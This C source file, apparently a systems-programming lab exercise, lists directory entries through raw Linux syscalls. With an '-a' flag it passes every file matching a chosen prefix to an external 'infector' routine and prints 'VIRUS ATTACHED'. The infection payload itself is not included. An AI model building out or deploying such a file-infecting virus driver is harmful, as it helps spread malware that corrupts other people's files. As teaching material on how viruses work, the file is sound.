#include "util.h"
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define GET_DENTS 141
#define EXIT 1
extern void infection();
extern void infector();
extern int system_call();

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
}linux_dirent;

int main (int argc , char* argv[], char* envp[]) {
    int infect;
    char prefix;
    int j;
    for (j = 0; j < argc; j++) {
        if (((argv[j])[0] == '-') && (argv[j])[1] == 'a') {
            infect = 1;
            prefix = *(argv[j] + 2);
        }
    }
    int BUFFER_SIZE = 8192;
    int fd;
    int len;
    struct linux_dirent *d;
    char buffer[BUFFER_SIZE];
    fd = system_call(SYS_OPEN, ".", 0, 0777);
    if (fd < 0) {
        system_call(EXIT, 0x55, 0, 0);
    }
    len = system_call(GET_DENTS, fd, buffer, BUFFER_SIZE);
    long i;
    for (i = 0; i < len;) {
        d = (struct linux_dirent *) (buffer + i);
        if (strlen(d->d_name) > 2) {
            if (infect == 1 && d->d_name[0] == prefix) {
                infector(d->d_name);
                system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            } else {
                system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }
        }
        i += d->d_reclen;
    }
    return 0;
}